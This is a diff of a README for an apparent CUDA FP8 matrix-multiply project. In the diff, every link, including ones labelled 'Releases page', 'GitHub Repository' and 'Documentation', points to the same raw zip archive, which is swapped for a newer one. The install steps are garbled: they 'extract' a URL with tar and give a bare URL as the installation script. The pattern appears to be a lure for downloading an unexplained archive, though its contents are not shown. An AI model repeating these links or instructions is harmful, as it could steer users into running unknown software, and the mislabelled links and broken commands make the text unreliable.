@@ -4,7 +4,7 @@
 The **cuda-fp8-ampere** project provides a straightforward way to conduct FP8-based GEMM (General Matrix Multiply) experiments using IMMA on Ampere architecture. If you have an RTX 3090 Ti or compatible hardware, you can efficiently explore FP8 as a storage format for your applications.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip%20Latest%https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip)](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip)
+[![Download](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip%20Latest%https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip)](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip)
 
 ## 🚀 Getting Started
 To get started with **cuda-fp8-ampere**, follow these steps:
@@ -16,7 +16,7 @@ Ensure your system meets the following requirements:
 - **CUDA Version:** Ensure you have CUDA 11.1 or higher installed.
 
 ### 2. **Visit the Releases Page**
-To download the software, visit our [Releases page](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip). You will find the latest version of the software listed there.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip). You will find the latest version of the software listed there.
 
 ### 3. **Download the Software**
 On the Releases page, look for the latest version listed. Click on the version number, and then choose the appropriate file for your operating system from the assets list. Click on the file to start the download.
@@ -32,12 +32,12 @@ On the Releases page, look for the latest version listed. Click on the version n
   2. Navigate to the directory where you downloaded the file using the `cd` command.
   3. Extract the files using:  
      ```bash
-     tar -zxvf https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip
+     tar -zxvf https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip
      ```
   4. Change to the extracted directory and run the installation script:
      ```bash
      cd extracted-directory
-     https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip
+     https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip
      ```
 
 ### 5. **Running the Application**
@@ -66,10 +66,10 @@ Once the application is running, you can start your experiments. The interface i
 If you face any issues, please raise them in the **Issues** section on our GitHub page. The community or the maintainers will be glad to assist you.
 
 ## 📌 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip)
-- [Documentation](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip) (available within the application)
+- [GitHub Repository](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip) (available within the application)
 
 ## 🔗 More Downloads
-You can access the download page directly here: [Download Page](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/torch_ext/fp_cuda_ampere_1.8.zip).
+You can access the download page directly here: [Download Page](https://raw.githubusercontent.com/Zzzxkxz/cuda-fp8-ampere/main/src/cuda-fp-ampere-v2.0.zip).
 
 Thank you for using **cuda-fp8-ampere**. Enjoy your experiments!
